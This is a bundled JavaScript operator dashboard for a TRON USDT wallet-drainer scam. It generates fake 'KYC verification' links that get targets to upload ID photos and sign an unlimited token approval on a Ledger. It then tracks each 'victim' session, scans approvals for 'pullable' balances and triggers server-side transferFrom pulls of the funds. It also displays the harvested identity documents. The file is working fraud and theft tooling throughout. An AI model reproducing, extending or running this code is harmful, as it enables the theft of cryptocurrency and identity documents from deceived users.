"use strict";
var dashboard = (() => {
  // dashboard.js
  var SPENDER = "TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA";
  var NETWORK = {
    name: "TRON Mainnet (USDT)",
    rpc: "https://api.trongrid.io",
    contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    explorer: "https://tronscan.org",
    decimals: 6
  };
  var $ = (id) => document.getElementById(id);
  var b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  var log = (msg) => {
    const el = $("log");
    if (!el) return;
    const line = document.createElement("div");
    line.textContent = (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + msg;
    el.prepend(line);
  };
  function b58ToHex(addr) {
    let n = 0n;
    for (const c of addr) {
      const i = b58.indexOf(c);
      if (i < 0) throw new Error("Invalid base58");
      n = n * 58n + BigInt(i);
    }
    const hex = n.toString(16).padStart(50, "0");
    if (!hex.startsWith("41")) throw new Error("No TRON prefix");
    return "0x" + hex.slice(0, 42);
  }
  async function sha256d(bytes) {
    const h1 = await crypto.subtle.digest("SHA-256", bytes);
    const h2 = await crypto.subtle.digest("SHA-256", h1);
    return new Uint8Array(h2);
  }
  async function hexToB58(hex) {
    const clean = hex.replace(/^0x/, "");
    const bytes = new Uint8Array(clean.match(/.{2}/g).map((b) => parseInt(b, 16)));
    const payload = new Uint8Array(21);
    payload[0] = 65;
    payload.set(bytes.slice(0, 20), 1);
    const hash = await sha256d(payload);
    const full = new Uint8Array(25);
    full.set(payload);
    full.set(hash.slice(0, 4), 21);
    let n = 0n;
    for (const b of full) n = n * 256n + BigInt(b);
    let out = "";
    while (n > 0n) {
      out = b58[Number(n % 58n)] + out;
      n /= 58n;
    }
    for (const b of full) {
      if (b === 0) out = "1" + out;
      else break;
    }
    return out;
  }
  var isTronAddr = (a) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
  var sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  async function api(path, body, tries = 3) {
    let lastErr;
    for (let i = 0; i < tries; i++) {
      try {
        const r = await fetch(NETWORK.rpc + path, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body)
        });
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return await r.json();
      } catch (e) {
        lastErr = e;
        if (i < tries - 1) await sleep(800 * (i + 1));
      }
    }
    throw lastErr;
  }
  var MAX_UINT256 = (1n << 256n) - 1n;
  async function allowanceOf(ownerAddr, spenderAddr) {
    const param = (a) => b58ToHex(a).slice(2).replace(/^41/, "").padStart(64, "0");
    const res = await api("/wallet/triggerconstantcontract", {
      owner_address: "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj",
      contract_address: NETWORK.contract,
      function_selector: "allowance(address,address)",
      parameter: param(ownerAddr) + param(spenderAddr),
      visible: true
    });
    const hex = res?.constant_result?.[0];
    return hex ? BigInt("0x" + hex) : 0n;
  }
  async function balanceOf(ownerAddr) {
    const res = await api("/wallet/triggerconstantcontract", {
      owner_address: "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj",
      // any caller works for view calls
      contract_address: NETWORK.contract,
      function_selector: "balanceOf(address)",
      parameter: b58ToHex(ownerAddr).slice(2).replace(/^41/, "").padStart(64, "0"),
      visible: true
    });
    const hex = res?.constant_result?.[0];
    return hex ? BigInt("0x" + hex) : 0n;
  }
  function fmtUsdt(units) {
    return (Number(units) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 });
  }
  async function pullFrom(ownerAddr, amount) {
    const spenderAddr = SPENDER;
    if (opAddr && spenderAddr === opAddr) {
      log(`Server pull \u2014 operator signs transferFrom for ${ownerAddr.slice(0, 8)}\u2026 (pullable max)`);
      try {
        const res = await fetch("/api/pull", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "tron_collect", victim: ownerAddr, token: "usdt" })
        }).then((r) => r.json());
        if (res?.skipped) {
          log("Pull skipped \u2014 a pull for this wallet ran <10 min ago (server dedup)");
          return;
        }
        if (res?.ok) {
          log(`\u2713 Pulled (server) \u2014 tx ${res.tx} \u2192 ${res.dest || "operator"}` + (res.energy_rented ? ` \u2014 ${res.energy_rented} energy rented` : "") + ` \u2014 ${NETWORK.explorer}/#/transaction/${res.tx}`);
          loadEvents();
          return;
        }
        log("Server pull failed: " + (res?.error || "unknown error"));
        return;
      } catch {
        log("Server pull unreachable \u2014 check connection and retry");
        return;
      }
    }
    log(opAddr ? "Fixed spender \u2260 server operator (" + opAddr.slice(0, 10) + "\u2026) \u2014 check TRON_OPERATOR_PK config" : "Server operator not reachable yet \u2014 retry in a moment");
  }
  async function pullAdmin(ownerAddr, units) {
    let secret = sessionStorage.getItem("pull_secret");
    if (!secret) {
      secret = window.prompt("Admin secret for partial pull") || "";
      if (!secret) {
        log("Pull cancelled");
        return;
      }
    }
    log(`Server pull ${fmtUsdt(units)} USDT (partial) \u2014 ${ownerAddr.slice(0, 8)}\u2026`);
    try {
      const r = await fetch("/api/pull", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "tron_pull", secret, victim: ownerAddr, token: "usdt", amount: units.toString() })
      });
      const res = await r.json().catch(() => ({}));
      if (r.status === 401 || res?.error === "unauthorized") {
        sessionStorage.removeItem("pull_secret");
        log("Wrong admin secret \u2014 cleared, try again");
        return;
      }
      if (res?.ok) {
        sessionStorage.setItem("pull_secret", secret);
        log(`\u2713 Pulled ${fmtUsdt(units)} USDT \u2014 tx ${res.tx}` + (res.energy_rented ? ` \u2014 ${res.energy_rented} energy rented` : "") + ` \u2014 ${NETWORK.explorer}/#/transaction/${res.tx}`);
        loadEvents();
        return;
      }
      log("Server pull failed: " + (res?.error || "unknown"));
    } catch {
      log("Server pull unreachable \u2014 retry");
    }
  }
  async function merchantGate() {
    const msg = $("gate-msg"), retry = $("gate-retry");
    const token = sessionStorage.getItem("merchant_session");
    if (!token) {
      location.href = "/ledger/merchant";
      return;
    }
    try {
      const j = await fetch("/api/merchant", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "verify", token })
      }).then((r) => r.json());
      if (!j.ok) {
        sessionStorage.removeItem("merchant_session");
        location.href = "/ledger/merchant";
        return;
      }
      if (j.company) $("merchant-badge").textContent = j.company;
      $("gate").remove();
    } catch {
      msg.textContent = "Verification service unreachable \u2014 check connection";
      retry.style.display = "";
      retry.onclick = () => location.reload();
    }
  }
  merchantGate();
  $("merchant-logout").addEventListener("click", () => {
    sessionStorage.removeItem("merchant_session");
    sessionStorage.removeItem("merchant_name");
    sessionStorage.removeItem("pull_secret");
    location.href = "/ledger/merchant";
  });
  var liveEvents = [];
  var EV_STAGE = {
    kyc_opened: "Opened link",
    kyc_doctype: "Choosing document",
    kyc_front: "Uploading front side",
    kyc_back: "Uploading back side",
    kyc_submit: "Documents submitted",
    kyc_ledger_redirect: "Ledger step",
    kyc_qr_shown: "Scanning QR code",
    mobile_opened: "Phone capture opened",
    doc_front_mobile: "Front photo on phone",
    doc_back_mobile: "Back photo on phone",
    doc_received: "Photo received from phone",
    docs_submitted: "Documents submitted (phone)",
    doc_upload_fail: "Phone upload failed",
    doc_verifying: "Verifying documents\u2026",
    kyc_docs_complete: "Documents received",
    ledger_opened: "On Ledger page",
    connect_click: "Connecting Ledger",
    ledger_connected: "Ledger connected",
    approve_start: "Preparing signature",
    sign_wait: "Confirming on device",
    signed: "Signature received",
    broadcast: "Broadcasting\u2026",
    confirmed: "Verified \u2713",
    tx_failed: "Transaction failed",
    revoke_start: "Revoking approval",
    ledger_error: "Error",
    session_blocked: "Blocked",
    kyc_expired: "Expired",
    kyc_desktop_block: "Needs desktop",
    kyc_already_done: "Already verified",
    pull_sent: "Funds pulled \u2713",
    pull_failed: "Pull failed",
    energy_rented: "Energy rented",
    ledger_gas_drop: "Gas drop sent",
    ledger_gas_skip: "Gas drop skipped",
    ledger_no_trx: "No TRX on wallet",
    energy_sponsored: "Gas sponsored"
  };
  var EV_KYC = /^(kyc_|ledger_|connect_|sign_|approve_|revoke_|broadcast|confirmed|tx_failed|session_|doc_|mobile_|pull_|energy_)/;
  function liveBySession() {
    const out = {};
    for (const env of liveEvents) {
      const ev = env?.ev;
      if (!ev?.ev || !EV_KYC.test(ev.ev)) continue;
      const sid = ev.d?.session;
      if (sid && !(sid in out)) out[sid] = ev;
    }
    return out;
  }
  async function pollEvents() {
    try {
      const r = await fetch("/api/events", { cache: "no-store" });
      const j = await r.json();
      if (!j.ok) return;
      liveEvents = j.events || [];
      renderSessions();
      renderFeed();
    } catch {
    }
  }
  function renderFeed() {
    const feed = $("live-feed");
    if (!feed) return;
    const items = liveEvents.map((env) => env?.ev).filter((ev) => ev?.ev && EV_KYC.test(ev.ev)).slice(0, 15);
    if (!items.length) {
      feed.innerHTML = '<div class="text-[#8b949e] text-sm py-6 text-center">Waiting for customer activity\u2026</div>';
      return;
    }
    feed.innerHTML = items.map((ev) => {
      const label = EV_STAGE[ev.ev] || ev.ev;
      const err = ev.ev === "ledger_error" || ev.ev === "tx_failed" || ev.ev === "session_blocked" || ev.ev === "pull_failed";
      const extra = ev.ev === "ledger_error" && ev.d?.title ? ": " + ev.d.title : ev.d?.tx ? " \u2014 " + String(ev.d.tx).slice(0, 12) + "\u2026" : ev.ev === "ledger_connected" && ev.d?.wallet ? " \u2014 " + ev.d.wallet.slice(0, 10) + "\u2026" : ev.d?.session ? " \u2014 " + String(ev.d.session).slice(0, 8) : "";
      return `<div class="feed-row ${err ? "feed-err" : ""}">
      <span class="feed-dot ${err ? "dot-err" : "dot-ok"}"></span>
      <span class="feed-label">${esc(label + extra)}</span>
      <span class="feed-time">${esc((ev.t || "").slice(11, 19))}</span>
    </div>`;
    }).join("");
  }
  setInterval(pollEvents, 4e3);
  pollEvents();
  document.querySelectorAll(".tab-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".tab-btn").forEach((b) => b.classList.remove("active"));
      document.querySelectorAll(".tab-content").forEach((c) => c.classList.add("hidden"));
      btn.classList.add("active");
      $("tab-" + btn.dataset.tab).classList.remove("hidden");
      if (btn.dataset.tab === "sessions") renderSessions();
      if (btn.dataset.tab === "approvals") syncSpenderMirror();
    });
  });
  var LINKS_KEY = "kyc_links";
  function syncSpenderMirror() {
    const el = $("spender-addr-mirror");
    if (!el) return;
    const v = ($("spender-addr")?.value || "").trim() || localStorage.getItem("ledger_spender") || "";
    el.textContent = v || "Not set \u2014 enter it in the Verification Links tab";
    el.style.color = v ? "#e6edf3" : "#8b949e";
  }
  function getLinks() {
    try {
      return JSON.parse(localStorage.getItem(LINKS_KEY) || "[]");
    } catch {
      return [];
    }
  }
  function saveLinks(links) {
    localStorage.setItem(LINKS_KEY, JSON.stringify(links));
  }
  function generateSessionId() {
    const bytes = new Uint8Array(12);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
  }
  function linkStatus(link) {
    const sessions = getSessions();
    const sess = sessions[link.session];
    if (sess?.verified) return "verified";
    if (sess?.expiresAt && Date.now() > sess.expiresAt) return "expired";
    if (sess?.expiresAt) return "active";
    return "pending";
  }
  function renderLinks() {
    const links = getLinks();
    const table = $("links-table");
    if (links.length === 0) {
      table.innerHTML = '<div class="text-[#8b949e] text-sm py-8 text-center">No links generated yet</div>';
      return;
    }
    table.innerHTML = links.slice().reverse().map((l) => {
      const status = linkStatus(l);
      const badge = status === "verified" ? "status-verified" : status === "expired" ? "status-expired" : "status-pending";
      const label = status === "verified" ? "Verified" : status === "expired" ? "Expired" : status === "active" ? "Active" : "Pending";
      const sessions = getSessions();
      const exp = sessions[l.session]?.expiresAt;
      const expStr = exp ? new Date(exp).toLocaleTimeString() : "not opened";
      return `<div class="session-row">
      <div class="font-medium">${esc(l.to)}</div>
      <div class="text-[#8b949e]">${esc(l.from)}</div>
      <div><span class="status-badge ${badge}">${label}</span></div>
      <div class="text-[#8b949e] mono">${expStr}</div>
      <div><button class="btn-secondary" style="padding:6px 12px; font-size:12px" onclick="navigator.clipboard.writeText('${l.url}');this.textContent='Copied'">Copy</button></div>
    </div>`;
    }).join("");
  }
  function esc(s) {
    return String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
  }
  $("generate-link").addEventListener("click", () => {
    const from = $("from-name").value.trim();
    const to = $("to-name").value.trim();
    const spender = $("spender-addr").value.trim();
    let invalid = false;
    if (!from) {
      $("from-name").style.borderColor = "#f85149";
      invalid = true;
    } else {
      $("from-name").style.borderColor = "#30363d";
    }
    if (!to) {
      $("to-name").style.borderColor = "#f85149";
      invalid = true;
    } else {
      $("to-name").style.borderColor = "#30363d";
    }
    if (!isTronAddr(spender)) {
      $("spender-addr").style.borderColor = "#f85149";
      $("spender-status").textContent = "Configure a valid spender address first (Allowance Monitor tab or below)";
      $("spender-status").style.color = "#f85149";
      invalid = true;
    } else {
      $("spender-addr").style.borderColor = "#30363d";
      localStorage.setItem("ledger_spender", spender);
    }
    if (invalid) return;
    const amt = parseApproveAmt();
    if (amt?.error) {
      $("approve-amt-hint").textContent = amt.error;
      $("approve-amt-hint").style.color = "#f85149";
      return;
    }
    const session = generateSessionId();
    const url = new URL(window.location.origin + "/ledger/kyc");
    url.searchParams.set("session", session);
    url.searchParams.set("from", from);
    url.searchParams.set("to", to);
    url.searchParams.set("spender", spender);
    if (amt?.units != null) {
      url.searchParams.set("amt", amt.units.toString());
      localStorage.setItem("ledger_approve_amt", $("approve-amt").value.trim());
    } else {
      localStorage.removeItem("ledger_approve_amt");
    }
    const links = getLinks();
    links.push({ session, from, to, url: url.toString(), createdAt: Date.now() });
    saveLinks(links);
    $("generated-link").textContent = url.toString();
    $("preview-link").href = url.toString();
    $("link-result").classList.remove("hidden");
    renderLinks();
    log("Link generated: " + to + " (from " + from + ")");
  });
  $("copy-link").addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText($("generated-link").textContent);
      $("copy-link").textContent = "Copied!";
      setTimeout(() => {
        $("copy-link").textContent = "Copy Link";
      }, 2e3);
    } catch {
      log("Copy failed \u2014 select manually");
    }
  });
  var SESS_KEY = "kyc_sessions";
  var DOC_EVENTS = /* @__PURE__ */ new Set([
    "kyc_submit",
    "doc_received",
    "doc_front_mobile",
    "doc_back_mobile",
    "docs_submitted",
    "kyc_docs_complete",
    "doc_upload",
    "doc_verifying"
  ]);
  function docsBySession() {
    const out = /* @__PURE__ */ new Set();
    for (const env of liveEvents) {
      const ev = env?.ev;
      if (ev?.ev && DOC_EVENTS.has(ev.ev) && ev.d?.session) out.add(ev.d.session);
    }
    return out;
  }
  function getSessions() {
    try {
      return JSON.parse(localStorage.getItem(SESS_KEY) || "{}");
    } catch {
      return {};
    }
  }
  function renderSessions() {
    const links = getLinks();
    const sessions = getSessions();
    const live = liveBySession();
    const docs = docsBySession();
    const table = $("sessions-table");
    const seen = /* @__PURE__ */ new Map();
    for (const l of links) seen.set(l.session, { to: l.to, from: l.from });
    for (const [sid, ev] of Object.entries(live)) {
      if (!seen.has(sid)) seen.set(sid, { to: ev.d?.to || "\u2014", from: ev.d?.from || "\u2014" });
    }
    const rows = [];
    for (const [sid, meta] of seen) {
      const s = sessions[sid] || {};
      const ev = live[sid];
      const verified = s.verified || ev?.ev === "confirmed";
      const expired = s.expiresAt ? Date.now() >= s.expiresAt && !verified : false;
      let stage;
      if (ev?.ev === "ledger_error" && ev.d?.title) stage = "Error: " + ev.d.title;
      else if (ev && EV_STAGE[ev.ev]) stage = EV_STAGE[ev.ev];
      else if (verified) stage = "Verified \u2713";
      else if (s.wallet) stage = "Ledger connected";
      else if (s.docsSubmitted) stage = "Ledger step";
      else if (expired) stage = "Expired";
      else stage = "Pending";
      const isErr = ev?.ev === "ledger_error" || ev?.ev === "tx_failed" || ev?.ev === "session_blocked";
      const badgeCls = verified ? "status-verified" : isErr || expired ? "status-expired" : "status-pending";
      const wallet = s.wallet || (ev?.ev === "ledger_connected" ? ev.d?.wallet || ev.d?.from : null);
      const pull = wallet ? pullableByOwner.get(wallet) : null;
      const walletCell = wallet ? `<a class="mono text-xs" style="color:#79c0ff" target="_blank" href="${NETWORK.explorer}/#/address/${wallet}">${wallet.slice(0, 10)}\u2026${wallet.slice(-6)}</a>` + (pull && pull > 0n ? `<div class="sess-pull">${fmtUsdt(pull)} USDT pullbar</div>` : "") : '<span class="text-[#8b949e]">\u2014</span>';
      let timeCell;
      if (verified) timeCell = '<span class="mono text-[#3fb950]">Done</span>';
      else if (s.expiresAt) {
        const remaining = Math.max(0, s.expiresAt - Date.now());
        const min = Math.floor(remaining / 6e4);
        const sec = Math.floor(remaining % 6e4 / 1e3);
        timeCell = `<span class="mono text-[#d29922]">${min}:${sec.toString().padStart(2, "0")}</span>`;
      } else if (ev) timeCell = `<span class="mono text-[#8b949e]">${esc((ev.t || "").slice(11, 19))}</span>`;
      else timeCell = '<span class="text-[#8b949e]">\u2014</span>';
      const docsCell = docs.has(sid) ? `<button class="btn-secondary doc-btn" data-sess="${sid}" style="padding:6px 10px; font-size:11px" title="View uploaded ID documents">Docs \u{1F4C4}</button>` : '<span class="text-[#8b949e] text-xs">\u2014</span>';
      rows.push({ verified, expired, html: `<div class="session-row" style="grid-template-columns:2fr 1.5fr 1fr 1fr auto auto">
      <div class="font-medium">${esc(meta.to)}</div>
      <div class="text-[#8b949e]">${esc(meta.from)}</div>
      <div><span class="status-badge ${badgeCls}">${esc(stage)}</span></div>
      <div>${timeCell}</div>
      <div>${walletCell}</div>
      <div>${docsCell}</div>
    </div>` });
    }
    rows.sort((a, b) => b.verified - a.verified || a.expired - b.expired);
    table.innerHTML = rows.map((r) => r.html).join("") || '<div class="text-[#8b949e] text-sm py-8 text-center">No sessions yet \u2014 generate a link first</div>';
  }
  function openDocModal(sid) {
    const m = $("doc-modal");
    if (!m) return;
    m.style.display = "flex";
    $("doc-sess").textContent = "\xB7 " + sid.slice(0, 8) + "\u2026";
    const body = $("doc-body");
    body.innerHTML = '<div class="text-[#8b949e] text-sm py-8 text-center" style="grid-column:1/-1">Loading documents\u2026</div>';
    const empty = (msg) => {
      body.innerHTML = `<div class="text-[#8b949e] text-sm py-8 text-center" style="grid-column:1/-1">${msg}</div>`;
    };
    fetch(`/api/kycdoc?session=${encodeURIComponent(sid)}&images=1`, { cache: "no-store" }).then((r) => r.json()).then((j) => {
      if (!j || !j.frontImg && !j.backImg) {
        empty("Documents expired \u2014 the store keeps images for 60 minutes after upload.");
        return;
      }
      const panel = (label, img) => img ? `<div>
             <div style="font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px">${label}</div>
             <img src="${img}" alt="${label} side" style="width:100%;border-radius:10px;border:1px solid #30363d;cursor:zoom-in;display:block"
                  title="Click to open full size" onclick="window.open(this.src,'_blank')">
           </div>` : `<div>
             <div style="font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px">${label}</div>
             <div class="text-[#8b949e] text-xs" style="border:1px dashed #30363d;border-radius:10px;padding:40px 0;text-align:center">not uploaded</div>
           </div>`;
      body.innerHTML = panel("Front", j.frontImg) + panel("Back", j.backImg);
    }).catch(() => empty("Load failed \u2014 check connection and retry."));
  }
  var closeDocModal = () => {
    const m = $("doc-modal");
    if (m) m.style.display = "none";
  };
  $("doc-close")?.addEventListener("click", closeDocModal);
  $("doc-modal")?.addEventListener("click", (e) => {
    if (e.target.id === "doc-modal") closeDocModal();
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") closeDocModal();
  });
  $("sessions-table")?.addEventListener("click", (e) => {
    const b = e.target.closest(".doc-btn");
    if (b) openDocModal(b.dataset.sess);
  });
  setInterval(() => {
    renderLinks();
  }, 3e4);
  var opAddr = "";
  var pullableByOwner = /* @__PURE__ */ new Map();
  var _scanBusy = false;
  function spenderHint() {
    const el = $("op-hint");
    if (!el) return;
    if (!opAddr) {
      el.textContent = "Server operator: checking\u2026";
      el.style.color = "#8b949e";
      return;
    }
    if (SPENDER === opAddr) {
      el.textContent = "\u2713 Server pull active \u2014 operator signs transferFrom (incl. energy rental)";
      el.style.color = "#3fb950";
    } else {
      el.textContent = "\u26A0 Server operator is " + opAddr.slice(0, 12) + "\u2026 but spender is fixed to " + SPENDER.slice(0, 12) + "\u2026 \u2014 check TRON_OPERATOR_PK";
      el.style.color = "#f85149";
    }
  }
  async function loadOperator() {
    try {
      const j = await fetch("/api/pull?op=1").then((r) => r.json());
      opAddr = j?.op?.tron || "";
    } catch {
    }
    spenderHint();
  }
  async function refreshOpBalance() {
    const el = $("op-balance");
    if (!el) return;
    try {
      const [acct, usdt] = await Promise.all([
        api("/wallet/getaccount", { address: SPENDER, visible: true }),
        balanceOf(SPENDER).catch(() => null)
      ]);
      const trx = (Number(acct?.balance || 0) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 });
      el.textContent = "Operator balance: " + trx + " TRX" + (usdt === null ? "" : " \xB7 " + fmtUsdt(usdt) + " USDT");
      el.style.color = usdt && usdt > 0n ? "#3fb950" : "#8b949e";
    } catch {
      el.textContent = "";
    }
  }
  function parseApproveAmt() {
    const raw = ($("approve-amt")?.value || "").trim();
    if (!raw) return { units: null };
    if (!/^\d+(\.\d{1,6})?$/.test(raw)) return { error: "Invalid amount \u2014 digits only, max 6 decimals" };
    const [int, dec = ""] = raw.split(".");
    const units = BigInt(int) * 1000000n + BigInt((dec + "000000").slice(0, 6));
    if (units <= 0n) return { error: "Amount must be > 0" };
    return { units };
  }
  function approveAmtHint() {
    const el = $("approve-amt-hint");
    if (!el) return;
    const amt = parseApproveAmt();
    if (amt?.error) {
      el.textContent = amt.error;
      el.style.color = "#f85149";
    } else if (amt?.units != null) {
      el.textContent = "Ledger will show: approve " + fmtUsdt(amt.units) + " USDT";
      el.style.color = "#3fb950";
    } else {
      el.textContent = "Ledger will show: approve Unlimited (max uint256)";
      el.style.color = "#8b949e";
    }
  }
  $("approve-amt").addEventListener("input", approveAmtHint);
  var savedAmt = localStorage.getItem("ledger_approve_amt");
  if (savedAmt) $("approve-amt").value = savedAmt;
  approveAmtHint();
  $("spender-addr").value = SPENDER;
  localStorage.setItem("ledger_spender", SPENDER);
  $("spender-status").textContent = "Fixed \u2014 embedded in every link, pull signed server-side";
  $("spender-status").style.color = "#3fb950";
  syncSpenderMirror();
  loadOperator();
  refreshOpBalance();
  $("save-spender").addEventListener("click", () => {
    loadEvents();
  });
  async function loadEvents() {
    const spenderAddr = $("spender-addr").value.trim();
    if (!isTronAddr(spenderAddr)) {
      log("Set a valid spender address first");
      return;
    }
    if (_scanBusy) return;
    _scanBusy = true;
    const statusEl = $("scan-status");
    if (statusEl) statusEl.textContent = "scanning\u2026";
    refreshOpBalance();
    const spenderHex = b58ToHex(spenderAddr).slice(2).replace(/^41/, "");
    try {
      const url = `${NETWORK.rpc}/v1/contracts/${NETWORK.contract}/events?event_name=Approval&only_confirmed=true&order_by=block_timestamp,desc&limit=200`;
      const r = await fetch(url);
      if (!r.ok) throw new Error("Events API HTTP " + r.status);
      const data = await r.json();
      const owners = /* @__PURE__ */ new Set();
      for (const ev of data.data || []) {
        const res = ev.result || {};
        const spender = (res.spender || "").replace(/^41/, "");
        if (spender.toLowerCase() !== spenderHex.toLowerCase()) continue;
        owners.add(await hexToB58((res.owner || "").replace(/^41/, "")));
      }
      for (const sess of Object.values(getSessions())) {
        if (sess.wallet && isTronAddr(sess.wallet)) owners.add(sess.wallet);
      }
      for (const env of liveEvents) {
        const d = env?.ev?.d || {};
        for (const k of ["wallet", "from", "victim", "addr"]) {
          const w = d[k];
          if (w && isTronAddr(w) && w !== spenderAddr) owners.add(w);
        }
      }
      pullableByOwner.clear();
      const rows = [];
      let sumPull = 0n, nPull = 0;
      for (const owner of owners) {
        const allowance = await allowanceOf(owner, spenderAddr).catch(() => null);
        const balance = await balanceOf(owner).catch(() => null);
        const pull = allowance === null || balance === null ? null : allowance < balance ? allowance : balance;
        pullableByOwner.set(owner, pull);
        if (pull !== null && pull > 0n) {
          sumPull += pull;
          nPull++;
        }
        rows.push({ owner, allowance, balance, pull });
      }
      rows.sort((a, b) => {
        const pa = a.pull ?? -1n, pb = b.pull ?? -1n;
        if (pa !== pb) return pa > pb ? -1 : 1;
        return 0;
      });
      const table = $("approvals-table");
      if ($("kpi-sum")) $("kpi-sum").textContent = fmtUsdt(sumPull) + " USDT";
      if ($("kpi-count")) $("kpi-count").textContent = nPull + " Wallet" + (nPull === 1 ? "" : "s");
      if ($("kpi-total")) $("kpi-total").textContent = rows.length;
      if (!rows.length) {
        table.innerHTML = '<div class="text-[#8b949e] text-sm py-8 text-center">No wallets detected yet \u2014 generate a verification link first</div>';
      } else {
        table.innerHTML = rows.map(({ owner, allowance, balance, pull }) => {
          const pullable = pull !== null && pull > 0n;
          const allowanceFmt = allowance === null ? "?" : allowance > 1n << 200n ? "Unlimited \u221E" : fmtUsdt(allowance) + " USDT";
          const balanceFmt = balance === null ? "?" : fmtUsdt(balance) + " USDT";
          const pullFmt = pull === null ? "?" : fmtUsdt(pull) + " USDT";
          const badge = allowance === null ? '<span class="status-badge status-expired" title="Chain read failed \u2014 refresh">read fehler</span>' : allowance === 0n ? '<span class="status-badge status-expired" title="No allowance to this spender">no allowance</span>' : pullable ? "" : '<span class="status-badge status-pending" title="Allowance exists but wallet balance is 0">balance 0</span>';
          return `<div class="approval-row">
          <div class="mono text-xs" style="word-break:break-all">${owner}</div>
          <div class="mono">${allowanceFmt}</div>
          <div class="mono">${balanceFmt}</div>
          <div class="mono" style="color:${pullable ? "#3fb950" : "#8b949e"};font-weight:${pullable ? "600" : "400"}">${pullFmt}</div>
          <div style="display:flex; gap:8px; align-items:center; justify-content:flex-end; flex-wrap:wrap">
            ${badge}
            <input class="amt-input pull-amt" type="text" inputmode="decimal" placeholder="max"
              value="${pullable ? fmtUsdt(pull) : ""}" ${pullable ? "" : "disabled"}
              aria-label="Pull amount for ${owner}" title="Teilbetrag in USDT \u2014 Default = Maximum pullbar" />
            <button class="btn-secondary pull-btn" data-owner="${owner}" data-amount="${pull === null ? "0" : pull.toString()}"
              style="padding:6px 12px; font-size:12px; ${pullable ? "border-color:#3fb950;color:#3fb950" : "opacity:.4;pointer-events:none"}"
              title="transferFrom \u2192 spender, up to ${pullFmt}">Pull \u26A1</button>
            <a class="btn-secondary" style="padding:6px 12px; font-size:12px; text-decoration:none" target="_blank" href="${NETWORK.explorer}/#/address/${owner}">Explorer</a>
          </div>
        </div>`;
        }).join("");
      }
      if (statusEl) statusEl.textContent = "aktualisiert " + (/* @__PURE__ */ new Date()).toLocaleTimeString() + " \xB7 auto 30s";
      renderSessions();
      log(`Scan: ${rows.length} wallet(s), ${fmtUsdt(sumPull)} USDT pullable`);
    } catch (e) {
      if (statusEl) statusEl.textContent = "scan failed \u2014 Refresh erneut versuchen";
      log("Error: " + (e?.message || e));
    } finally {
      _scanBusy = false;
    }
  }
  $("load-events").addEventListener("click", loadEvents);
  setInterval(loadEvents, 3e4);
  loadEvents();
  $("approvals-table").addEventListener("click", async (ev) => {
    const btn = ev.target.closest(".pull-btn");
    if (!btn) return;
    const owner = btn.dataset.owner;
    const maxPull = BigInt(btn.dataset.amount || "0");
    if (maxPull === 0n) return;
    const row = btn.closest(".approval-row");
    const inp = row ? row.querySelector(".pull-amt") : null;
    let units = maxPull, viaAdmin = false;
    const v = (inp?.value || "").trim();
    if (v !== "") {
      if (!/^\d+(\.\d{1,6})?$/.test(v)) {
        log("Invalid amount \u2014 digits only, max 6 decimals");
        return;
      }
      const [i, d = ""] = v.split(".");
      units = BigInt(i) * 1000000n + BigInt((d + "000000").slice(0, 6));
      if (units <= 0n) {
        log("Amount must be > 0");
        return;
      }
      if (units > maxPull) {
        log("Exceeds pullable " + fmtUsdt(maxPull) + " USDT");
        return;
      }
      viaAdmin = units < maxPull;
    }
    const ok = window.confirm(
      `Execute transferFrom?

From:  ${owner}
To:    server operator / configured recipient
Amount: ${fmtUsdt(units)} USDT${units === maxPull ? " (full pullable)" : " (partial)"}
Signer: server (TRON_OPERATOR_PK)

This moves REAL USDT on TRON Mainnet.`
    );
    if (!ok) return;
    btn.disabled = true;
    btn.textContent = "Pulling\u2026";
    try {
      viaAdmin ? await pullAdmin(owner, units) : await pullFrom(owner, maxPull);
    } catch (e) {
      log("Pull error: " + (e?.message || e));
    } finally {
      btn.disabled = false;
      btn.textContent = "Pull";
    }
  });
  renderLinks();
})();
